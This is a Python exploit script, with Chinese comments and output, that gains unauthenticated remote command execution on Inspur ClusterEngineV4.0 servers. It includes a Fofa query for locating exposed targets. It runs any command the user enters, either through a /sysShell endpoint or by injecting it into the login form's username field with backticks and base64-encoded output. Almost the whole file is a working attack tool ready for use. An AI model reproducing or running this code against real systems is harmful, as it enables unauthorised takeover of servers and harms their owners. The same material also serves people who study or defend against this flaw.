#  浪潮云 ClusterEngineV4.0 前台getshell
#  Fofa：body="ClusterEngineV4.0"  title="TSCEV4.0"

import requests
import urllib3
import json
urllib3.disable_warnings()

def title():
    print("[----------------------------------------------------------]")
    print("[--------      浪潮云 ClusterEngineV4.0 前台RCE      --------]")
    print("[--------         use: python3 insuperRCE.py         -------]")
    print("[--------             Author: Henry4E36            --------]")
    print("[----------------------------------------------------------]")
    print("\n")

    print("""
    说明：脚本可以检测 浪潮云 ClusterEngineV4.0 前台getshell 漏洞
         存在两类RCE类型：
        【1】 登录表单RCE  ---  返回结果请进行base64解码
        【2】 集群shellRCE 
         
    """)

def node_rce(url,command):
    target_url = url + "/sysShell"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
    }

    data = f"op=doPlease&node=cu01&command={command}"

    try:
        res = requests.post(url=target_url,headers=headers,data=data,verify=False,timeout=5)
        outprint = res.text.replace('<br>',"\n")
        if "root" in outprint and res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在RCE漏洞！")
            print(f"[-]  正在执行命令: {command}\033[0m")
            print(f"[-]  响应内容为:\n {outprint}")
        elif "command not found":
            print(f"[0]  目标系统: {url} 不支持该命令！")
        else:
            print(f"[0]  目标系统: {url} 不存在RCE！")
    except Exception as e:
        print(f"[0]  目标系统: {url} 出现异常！")

def form_rce(url,command):
    target_url = url + "/login"
    headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        }

    data = f"op=login&username=admin; `{command} "+r"| base64 | sed ':label;N;s/\n/ /;b label' | sed 's/ //g'`"
    try:
        res = requests.post(url=target_url,headers=headers,data=data,verify=False,timeout=5)
        status = json.loads(res.text)["exitcode"]
        content = json.loads(res.text)["err"]
        if status == 127 and res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在RCE漏洞！")
            print(f"[-]  正在执行命令: {command}\033[0m")
            print(f"[-]  响应内容为:\n {content}")
        else:
            print(f"[0]  目标系统: {url} 存在RCE漏洞！")
    except Exception as e:
        print(f"[0]  目标系统: {url} 出现异常！")



if __name__ == "__main__":
    title()
    option = int(input("[-]  请选择RCE类型 1 or 2 :\n"))
    url = str(input("[-]  请输入目标系统URL:\n"))
    command = str(input("[-]  请输入需要执行的命令:\n"))
    if option == 1:
        form_rce(url,command)
    elif option == 2:
        node_rce(url,command)
    else:
        print("[-]  你的输入有误，请重新输入！")

